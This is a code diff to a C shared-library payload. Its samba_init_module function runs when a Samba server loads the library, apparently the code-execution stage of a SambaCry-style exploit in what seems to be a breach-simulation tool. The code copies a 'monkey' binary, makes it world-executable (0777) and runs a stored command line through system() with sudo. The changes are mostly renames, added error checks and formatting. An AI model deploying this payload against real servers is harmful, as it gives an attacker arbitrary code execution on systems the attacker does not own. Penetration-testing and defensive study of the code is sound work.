@@ -4,13 +4,13 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#include "monkey_runner.h"
+#include "sc_monkey_runner.h"
 
-#if __x86_64__
+#ifdef __x86_64__
 	#define ARC_IS_64
 #endif
 
-#if _____LP64_____
+#ifdef _____LP64_____
 	#define ARC_IS_64
 #endif
 
@@ -19,16 +19,16 @@
 
 int samba_init_module(void)
 {
-#if ARC_IS_64
-	const char RUNNER_FILENAME[] = "monkey_runner64.so";
+#ifdef ARC_IS_64
+	const char RUNNER_FILENAME[] = "sc_monkey_runner64.so";
 	const char MONKEY_NAME[] = "monkey64";
 	const char MONKEY_COPY_NAME[] = "monkey64_2";
 #else
-	const char RUNNER_FILENAME[] = "monkey_runner32.so";
+	const char RUNNER_FILENAME[] = "sc_monkey_runner32.so";
 	const char MONKEY_NAME[] = "monkey32";
 	const char MONKEY_COPY_NAME[] = "monkey32_2";
 #endif
-
+	const char RUNNER_RESULT_FILENAME[] = "monkey_runner_result";
 	const char COMMANDLINE_FILENAME[] = "monkey_commandline.txt";
 	const char ACCESS_MODE_STRING[] = "0777";
 	const char RUN_MONKEY_CMD[] = "sudo ./";
@@ -83,6 +83,16 @@ int samba_init_module(void)
 		return 0;
 	}
 	
+	// Write file to indicate we're running
+	pFile = fopen(RUNNER_RESULT_FILENAME, "w");
+	if (pFile == NULL)
+	{
+		return 0;
+	}
+	
+	fwrite(monkeyDirectory, 1, strlen(monkeyDirectory), pFile);
+	fclose(pFile);
+	
 	// Read commandline
 	pFile = fopen(COMMANDLINE_FILENAME, "r");
 	if (pFile == NULL)
@@ -106,12 +116,12 @@ int samba_init_module(void)
 		return 0;
 	}
 	
-	if (0 != fseek (pFile , 0 , SEEK_END))
+	if (0 != fseek (pFile, 0 ,SEEK_END))
 	{
 		return 0;
 	}
 	
-	monkeySize = ftell (pFile);
+	monkeySize = ftell(pFile);
 	
 	if (-1 == monkeySize)
 	{
@@ -131,19 +141,24 @@ int samba_init_module(void)
 	fclose(pFile);
 	
 	pFile = fopen(MONKEY_COPY_NAME, "wb");
+	if (pFile == NULL)
+	{
+		free(monkeyBinary);
+		return 0;
+	}
 	fwrite(monkeyBinary, 1, monkeySize, pFile);
 	fclose(pFile);
 	free(monkeyBinary);
 	
 	// Change monkey permissions
     accessMode = strtol(ACCESS_MODE_STRING, 0, 8);
-    if (chmod (MONKEY_COPY_NAME, accessMode) < 0)
+    if (chmod(MONKEY_COPY_NAME, accessMode) < 0)
     {
         return 0;
     }
 	
 	system(commandline);
-
+	
 	return 0;
 }
 
